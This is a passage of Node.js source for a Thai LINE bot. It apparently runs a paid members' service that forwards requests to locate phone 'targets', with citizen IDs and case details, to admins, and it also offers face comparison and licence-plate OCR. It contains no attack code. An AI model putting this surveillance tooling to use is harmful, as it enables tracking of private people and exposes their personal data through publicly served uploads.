      const fileName = `base_${userId}_${Date.now()}.jpg`;
      const savePath = path.join(UPLOAD_DIR, fileName);

      await downloadLineImage(event.message.id, savePath);

      const registeredName =
        [member?.rank, member?.fullname].filter(Boolean).join(' ').trim() ||
        member?.lineName ||
        profile.displayName ||
        '-';

      const adminText =
` รายการ BASE ใหม่

 หมายเลขเป้าหมาย: ${session.phone || '-'}
 เครือข่าย: ${session.network || '-'}
 ชื่อเคส/คดี: ${session.caseName || '-'}
 ข้อมูลเป้าหมาย: ${session.targetInfo || '-'}
 เลขบัตรเป้าหมาย: ${session.citizenId || '-'}

────────────
 ข้อมูลผู้ขอ
ชื่อ LINE: ${profile.displayName || '-'}
ชื่อที่สมัคร: ${registeredName}
เบอร์ที่สมัคร: ${member?.phone || '-'}
ตำแหน่ง: ${member?.position || '-'}
สังกัด: ${member?.department || '-'}
UID: ${userId}
เวลาส่ง: ${nowThai()}

ตอบกลับสมาชิก:
send#${userId}#ข้อความที่ต้องการส่ง`;

      await notifyAdmins([
        {
          type: 'text',
          text: limitLineMessage(adminText)
        },
        {
          type: 'image',
          originalContentUrl: `${BASE_URL}/uploads/${fileName}`,
          previewImageUrl: `${BASE_URL}/uploads/${fileName}`
        }
      ]);

      delete baseRequestSessions[userId];

      return reply(event.replyToken, {
        type: 'text',
        text:
`✅ รับข้อมูลคำขอ BASE เรียบร้อยแล้ว
ระบบได้รวบรวมข้อมูลและส่งให้แอดมินตรวจสอบแล้วครับ`
      });
    } catch (err) {
      console.error('base evidence upload error:', err?.response?.data || err.message);

      return reply(event.replyToken, {
        type: 'text',
        text: '❌ บันทึกภาพหลักฐานหรือแจ้งแอดมินไม่สำเร็จ กรุณาส่งรูปอีกครั้ง'
      });
    }
  }

  if (supportSlipSessions[userId]?.step === 'waiting_slip') {
  try {
    const profile = await getProfile(userId);

    const fileName = `support_${userId}_${Date.now()}.jpg`;
    const savePath = path.join(UPLOAD_DIR, fileName);

    await downloadLineImage(
      event.message.id,
      savePath
    );

    delete supportSlipSessions[userId];

    for (const adminId of ADMIN_IDS) {
      await push(adminId, [
        {
          type: 'text',
          text:
` มีสมาชิกส่งสลิปสนับสนุน

 ชื่อ LINE:
${profile.displayName || '-'}

 UID:
${userId}

 เบอร์ที่ลงทะเบียน:
${member?.phone || '-'}`
        },
        {
          type: 'image',
          originalContentUrl: `${BASE_URL}/uploads/${fileName}`,
          previewImageUrl: `${BASE_URL}/uploads/${fileName}`
        }
      ]);
    }

    return reply(event.replyToken, {
      type: 'text',
      text: "✅ ได้รับสลิปสนับสนุนแล้วครับ\nขอบคุณสำหรับการสนับสนุนครับ "
    });

  } catch (err) {
    console.log('support slip upload error:', err.message);

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ บันทึกสลิปสนับสนุนไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
    });
  }
}
  
if (
topup &&
topup.status === 'waiting_slip'
){

try{

const fileName=`topup_${userId}_${Date.now()}.jpg`;
const savePath=path.join(UPLOAD_DIR,fileName);

await downloadLineImage(
event.message.id,
savePath
);

topup.status='pending_review';
topup.updatedAt=nowThai();
topup.slipImagePath=savePath;

db.topups[userId]=topup;
saveDB(db);

// ล้างโหมดเทียบหน้า
delete faceCompareSessions[userId];

return reply(event.replyToken,{
type:'text',
text:"✅ ได้รับสลิปแล้ว\n รอแอดมินตรวจสอบ"
});

}catch(err){

console.log(
'topup upload:',
err.message
);

return reply(event.replyToken,{
type:'text',
text:'❌ บันทึกสลิปไม่สำเร็จ'
});

}

}

 // ===== ff% เปรียบเทียบใบหน้า =====
  const session = faceCompareSessions[userId];

console.log("SESSION =", session);

if (session) {

    console.log("เข้าโหมด ff");

    const dir = path.join(__dirname,'tmp');

    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir);
    }

    const imagePath = path.join(
      dir,
      `${userId}_${Date.now()}_${session.images.length+1}.jpg`
    );

    console.log("กำลังโหลดรูป...");

    await saveLineImage(
      event.message.id,
      imagePath
    );

    console.log("บันทึกรูปแล้ว");

    session.images.push(imagePath);

    console.log(
      "จำนวนรูป:",
      session.images.length
    );

    if(session.images.length===1){

      return reply(event.replyToken,{
        type:'text',
        text:`✅ รับรูปใบหน้าที่ 1 แล้ว

กรุณาส่งรูปใบหน้าที่ 2`
      });

    }

    if(session.images.length===2){

      try{

        const result= await compareFace(
          session.images[0],
          session.images[1]
        );

        delete faceCompareSessions[userId];

        fs.unlinkSync(session.images[0]);
        fs.unlinkSync(session.images[1]);

        return reply(event.replyToken,{
          type:'text',
          text:formatFaceCompare(result)
        });

      }catch(err){

  console.log("SAVE/COMPARE ERROR =", err.response?.data || err.message);

  delete faceCompareSessions[userId];

  return reply(event.replyToken,{
    type:'text',
    text:'❌ เปรียบเทียบใบหน้าไม่สำเร็จ'
  });

}

    }
  }

if (plateOcrSessions[userId]) {
  const dir = path.join(__dirname, 'tmp');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

  const imagePath = path.join(
    dir,
    `${userId}_${Date.now()}_plate.jpg`
  );

  try {
    await saveLineImage(event.message.id, imagePath);

    const result = await readPlateOcr(imagePath);

    delete plateOcrSessions[userId];

    if (fs.existsSync(imagePath)) fs.unlinkSync(imagePath);

    return reply(event.replyToken, {
      type: 'text',
      text: formatPlateOcr(result)
    });

  } catch (err) {
    console.log('PLATE OCR ERROR =', err.response?.data || err.message);

    delete plateOcrSessions[userId];

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ อ่านป้ายทะเบียนไม่สำเร็จ'
    });
  }
}

  if (!member) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌กรุณาสมัครสมาชิกก่อน โดยพิมพ์: ยินยอมรับข้อตกลง'
    });
  }

  if (member.status === 'waiting_card') {
    // อนุญาตให้ส่งรูปหลักฐานสมัครต่อได้
  } else if (!isActiveMember(member)) {
    return reply(event.replyToken, {
      type: 'text',
      text: "ยังไม่ได้รับการอนุมัติ/สมาชิกหมดอายุ"
    });
  }

  if (topup && topup.status === 'waiting_slip') {
    try {
      const fileName = `topup_${userId}_${Date.now()}.jpg`;
      const savePath = path.join(UPLOAD_DIR, fileName);

      await downloadLineImage(event.message.id, savePath);

if (db.faceCompare?.[userId]) {
  const state = db.faceCompare[userId];

  if (state.step === 1) {
    state.file1 = savePath;
    state.step = 2;
    saveDB(db);

    return reply(event.replyToken,{
      type:'text',
      text:"✅ ได้รับรูปที่ 1 แล้ว\n กรุณาส่งรูปใบหน้ารูปที่ 2"
    });
  }

  if(state.step===2){
    state.file2=savePath;

    try{

      const result=
      await compareFace(
        state.file1,
        state.file2
      );

      delete db.faceCompare[userId];
      saveDB(db);

      return reply(event.replyToken,{
        type:'text',
        text:formatFaceCompare(result)
      });

    }catch(err){

      console.log(
       'face compare:',
       err.response?.data || err.message
      );

      delete db.faceCompare[userId];
      saveDB(db);

      return reply(event.replyToken,{
        type:'text',
        text:"กรุณาส่งรูปใหม่อีกครั้ง"
      });
    }
  }
}

      topup.status = 'pending_review';
      topup.updatedAt = nowThai();
      topup.slipImagePath = savePath;
      topup.slipImageUrl = BASE_URL ? `${BASE_URL}/uploads/${fileName}` : '';
      db.topups[userId] = topup;
      saveDB(db);

      await reply(event.replyToken, {
        type: 'text',
        text: 'รับสลิปเรียบร้อยแล้ว ✅\nขณะนี้รอผู้ดูแลตรวจสอบ'
      });

      const adminMessages = [buildTopupAdminFlex(topup, userId)];

      if (topup.slipImageUrl) {
        adminMessages.push({
          type: 'image',
          originalContentUrl: topup.slipImageUrl,
          previewImageUrl: topup.slipImageUrl
        });
      }

      await notifyAdmins(adminMessages);
      return null;
    } catch (e) {
      console.error('topup slip error:', e?.response?.data || e.message);
      return reply(event.replyToken, {
        type: 'text',
        text: 'เกิดข้อผิดพลาดในการบันทึกสลิป กรุณาลองส่งใหม่อีกครั้ง'
      });
    }
  }

  if (!member) {
    return reply(event.replyToken, {
      type: 'text',
      text: 'กรุณาสมัครสมาชิกก่อน โดยพิมพ์: ยินยอมรับข้อตกลง'
    });
  }

  if (member.status !== 'waiting_card') {
    return reply(event.replyToken, {
      type: 'text',
      text: 'ระบบไม่ได้รอรับรูปหลักฐานจากคุณในขณะนี้'
    });
  }

  try {
    const fileName = `${userId}_${Date.now()}.jpg`;
    const savePath = path.join(UPLOAD_DIR, fileName);

    await downloadLineImage(event.message.id, savePath);

    member.status = 'pending';
    member.updatedAt = nowThai();
    member.imagePath = savePath;
    member.imageUrl = BASE_URL ? `${BASE_URL}/uploads/${fileName}` : '';
    db.members[userId] = member;
    saveDB(db);

    await reply(event.replyToken, {
      type: 'text',
      text: 'รับรูปหลักฐานเรียบร้อยแล้ว\nขณะนี้อยู่ระหว่างรอการตรวจสอบจากผู้ดูแล'
    });

    const adminMessages = [buildAdminApproveFlex(member, userId)];

    if (member.imageUrl) {
      adminMessages.push({
        type: 'image',
        originalContentUrl: member.imageUrl,
        previewImageUrl: member.imageUrl
      });
    } else {
      adminMessages.push({
        type: 'text',
        text: `ผู้สมัคร ${member.fullname || userId} ส่งรูปแล้ว แต่ยังไม่มี BASE_URL สำหรับแสดงภาพ`
      });
    }

    await notifyAdmins(adminMessages);
    return null;
  } catch (e) {
    console.error('handleImage error:', e?.response?.data || e.message);
    return reply(event.replyToken, {
      type: 'text',
      text: 'เกิดข้อผิดพลาดในการบันทึกรูป กรุณาลองส่งใหม่อีกครั้ง'
    });
  }
}

async function handlePostback(event) {
  const adminUserId = event.source.userId;
  const data = event.postback.data || '';

  if (!isAdmin(adminUserId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: 'คุณไม่มีสิทธิ์ใช้งานคำสั่งนี้'
    });
  }

  const db = loadDB();

if (data.startsWith('approve_member:')) {

  const targetUserId = data.replace('approve_member:', '').trim();

  if (!db.members[targetUserId]) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ ไม่พบสมาชิกนี้'
    });
  }

  db.members[targetUserId].status = 'approved';

const now = new Date();
const expire = new Date();

expire.setDate(expire.getDate() + 30);

db.members[targetUserId].approvedAt = now.toISOString();
db.members[targetUserId].expireAt = expire.toISOString();
db.members[targetUserId].approvedDays = 30;

  saveDB(db);

const pendingCount = Object.values(db.members || {})
  .filter(m => m.status === 'pending').length;

return reply(event.replyToken, {
  type: 'text',
  text:
`✅ อนุมัติสมาชิกเรียบร้อย

 ${db.members[targetUserId].fullname || db.members[targetUserId].name || targetUserId}

 คงเหลือสมาชิกรอตรวจสอบ: ${pendingCount} คน`
});

}

  if (data.startsWith('admin_members_all')) {
  const page = Number(data.split('_').pop()) || 1;

  return reply(event.replyToken, {
    type: 'text',
    text: buildMembersAllText(db, page)
  });
}

 if (data === 'admin_members_pending') {

  return reply(
    event.replyToken,
    buildPendingMembersFlex(db)
  );

}

  if (data === 'admin_members_expired') {
    return reply(event.replyToken, {
      type: 'text',
      text: buildMembersExpiredText(db)
    });
  }

  if (data === 'admin_topup_pending') {
    return reply(event.replyToken, {
      type: 'text',
      text: buildTopupPendingText(db)
    });
  }

  const parts = data.split('|');
  const action = parts[0];
  const targetUserId = parts[1];

  if (!action || !targetUserId) {
    return reply(event.replyToken, {
      type: 'text',
      text: 'ข้อมูลคำสั่งไม่ถูกต้อง'
    });
  }

  if (action === 'topup_approved') {
    if (!db.topups || !db.topups[targetUserId]) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'ไม่พบรายการ TOPUP'
      });
    }

    db.topups[targetUserId].status = 'approved';
    db.topups[targetUserId].updatedAt = nowThai();
    saveDB(db);

    try {
      await push(targetUserId, {
        type: 'text',
        text:
          'แอดมินตรวจสอบ TOPUP ของคุณแล้ว ✅\n' +
          'จากนี้ผู้ดูแลจะกำหนดจำนวนวันสมาชิกให้เอง'
      });
    } catch (e) {
      console.error('push topup approved error:', e?.response?.data || e.message);
    }

    return reply(event.replyToken, {
      type: 'text',
      text:
        `อนุมัติรายการ TOPUP ของ ${db.topups[targetUserId].fullname || targetUserId} แล้ว\n` +
        `จากนี้กำหนดวันสมาชิกด้วยปุ่มอนุมัติหรือคำสั่งต่ออายุได้เลย`
    });
  }

  if (action === 'topup_rejected') {
    if (!db.topups || !db.topups[targetUserId]) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'ไม่พบรายการ TOPUP'
      });
    }

    db.topups[targetUserId].status = 'rejected';
    db.topups[targetUserId].updatedAt = nowThai();
    saveDB(db);

    try {
      await push(targetUserId, {
        type: 'text',
        text: 'รายการ TOPUP ของคุณไม่ผ่านการตรวจสอบ ❌\nกรุณาติดต่อผู้ดูแล'
      });
    } catch (e) {
      console.error('push topup rejected error:', e?.response?.data || e.message);
    }

    return reply(event.replyToken, {
      type: 'text',
      text: `ปฏิเสธรายการ TOPUP ของ ${db.topups[targetUserId].fullname || targetUserId} เรียบร้อยแล้ว`
    });
  }

  const member = db.members[targetUserId];

  if (!member) {
    return reply(event.replyToken, {
      type: 'text',
      text: 'ไม่พบข้อมูลผู้สมัคร'
    });
  }

  if (action === 'approve_days') {
    const days = Number(parts[2] || 0);

    if (![30, 90, 180, 365].includes(days)) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'จำนวนวันไม่ถูกต้อง'
      });
    }

    const expireDate = addDaysFromNow(days);

    member.status = 'approved';
    member.updatedAt = nowThai();
    member.approvedAt = nowThai();
    member.approvedDays = days;
    member.expireAt = expireDate.toISOString();
    member.renewCount = Number(member.renewCount || 0);

    db.members[targetUserId] = member;
    saveDB(db);

    try {
      await push(targetUserId, {
        type: 'text',
        text:
          `บัญชีของคุณได้รับการอนุมัติแล้ว ✅\n` +
          `อายุสมาชิก: ${days} วัน\n` +
          `วันหมดอายุ: ${formatThaiDate(expireDate)}`
      });
    } catch (e) {
      console.error('push approved error:', e?.response?.data || e.message);
    }

    return reply(event.replyToken, {
      type: 'text',
      text:
        `อนุมัติ ${member.fullname || targetUserId} เรียบร้อยแล้ว\n` +
        `อายุสมาชิก: ${days} วัน\n` +
        `หมดอายุ: ${formatThaiDate(expireDate)}`
    });
  }

  if (action === 'renew_days') {
    const days = Number(parts[2] || 0);

    if (![30, 90, 180, 365].includes(days)) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'จำนวนวันไม่ถูกต้อง'
      });
    }

    let baseDate = new Date();
    if (member.expireAt && !isExpired(member.expireAt)) {
      baseDate = new Date(member.expireAt);
    }

    baseDate.setDate(baseDate.getDate() + days);

    member.status = 'approved';
    member.updatedAt = nowThai();
    member.approvedDays = days;
    member.expireAt = baseDate.toISOString();
    member.renewCount = Number(member.renewCount || 0) + 1;

    db.members[targetUserId] = member;
    saveDB(db);

    try {
      await push(targetUserId, {
        type: 'text',
        text:
          `สมาชิกของคุณได้รับการต่ออายุแล้ว ✅\n` +
          `ต่อเพิ่ม: ${days} วัน\n` +
          `วันหมดอายุใหม่: ${formatThaiDate(baseDate)}`
      });
    } catch (e) {
      console.error('push renew error:', e?.response?.data || e.message);
    }

    return reply(event.replyToken, {
      type: 'text',
      text:
        `ต่ออายุ ${member.fullname || targetUserId} เรียบร้อยแล้ว\n` +
        `เพิ่ม: ${days} วัน\n` +
        `หมดอายุใหม่: ${formatThaiDate(baseDate)}`
    });
  }

  if (action === 'reject') {
    member.status = 'rejected';
    member.updatedAt = nowThai();
    db.members[targetUserId] = member;
    saveDB(db);

    try {
      await push(targetUserId, {
        type: 'text',
        text: 'การสมัครของคุณถูกปฏิเสธ ❌'
      });
    } catch (e) {
      console.error('push rejected error:', e?.response?.data || e.message);
    }

    return reply(event.replyToken, {
      type: 'text',
      text: `ปฏิเสธ ${member.fullname || targetUserId} เรียบร้อยแล้ว`
    });
  }

  return reply(event.replyToken, {
    type: 'text',
    text: 'ไม่รู้จักคำสั่งนี้'
  });
}
